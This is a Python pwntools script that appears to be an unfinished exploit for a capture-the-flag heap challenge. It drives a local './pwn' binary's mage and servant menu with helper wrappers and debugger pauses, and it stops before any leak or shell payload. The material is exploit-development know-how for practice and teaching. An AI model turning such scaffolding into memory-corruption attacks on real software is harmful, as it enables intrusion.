#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

# remote_service = ""
# remote_service = remote_service.strip().split(":")
# p = remote(remote_service[0], int(remote_service[1]))
filename = "./pwn"
p = process(filename)
e = ELF(filename, checksec=False)
l = ELF(e.libc.path, checksec=False)

rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
i2b = lambda c : str(c).encode()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
	lg("p.pid")
	input()
	pass

def cmd(choice):
	ru(b'>> ')
	sl(i2b(choice))
def add_mage(trick=b'aaa', newline=True):
	cmd(1)
	ru(b"What's your trick?\n")
	if newline:
		trick += b'\n'
	sn(trick)
def add_servant(idx, name, info):
	cmd(2)
	ru(b'Recruit Servant for which Mage?\n')
	sl(i2b(idx))
	ru( b'Servant name: \n')
	sl(name)
	ru(b'Servant info: \n')
	sl(info)
def expel_mage(idx, offer_by_one=0, offer_by_one_content=None):
	global offer_by_one_fl
	cmd(3)
	ru(b'Which Mage?\n')
	sl(i2b(idx))
	if offer_by_one_fl:
		ru( b'Offer by one?\n')
		if offer_by_one:
			sn(b'y')
			sn(offer_by_one_content)
			offer_by_one_fl = 0
		else:
			sl(b'n')
def attack(idx, MAGE=1):
	cmd(4)
	ru(b'Would you like to select a Mage to attack ?\n')
	if MAGE:
		sl(b'y')
		ru(b"Which Mage ?")
		sl(i2b(idx))


offer_by_one_fl = 1
ru(b'Your name: \n')
sn(b'a'*47)

for i in range(9):
	add_mage()
for i in range(8):
	attack(i)

debugPID()
attack(8)
expel_mage(7)




debugPID()
irt()
